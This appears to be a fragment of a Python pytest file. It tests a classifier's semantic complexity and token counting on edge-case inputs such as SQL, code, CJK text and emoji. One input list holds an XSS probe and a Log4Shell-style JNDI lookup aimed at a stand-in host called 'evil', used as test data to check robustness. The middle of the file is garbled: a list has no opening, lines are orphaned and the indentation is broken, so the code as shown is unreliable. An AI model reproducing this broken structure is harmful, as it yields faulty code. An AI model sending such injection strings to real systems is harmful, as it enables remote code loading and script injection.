    ("", 0),                    # Empty string

    ("a", 1),                   # Single character
    ("hi", 1),                  # Simple greeting

    ("SELECT * FROM table", 3), # SQL query
    ("lambda x: x.map(f)", 4),  # Complex code
    ("积分变换", 2),             # Chinese (multilingual)
    ("日本語のテキスト", 2),    # Japanese
    ("🎉🎊🔥", 1),              # Emojis
])
def test_semantic_complexity_edge_cases(self, text, expected_min_score):
    """Cover semantic complexity edge cases"""
    classifier = CognitiveClassifier()
    score = classifier._calculate_semantic_complexity(text)
    assert score >= expected_min_score

    classifier = CognitiveClassifier()

        "<script>alert(1)</script>",  # HTML-like
        "${jndi:ldap://evil}",  # Injection-like
    ]

        assert tokens >= 0  # Should not crash
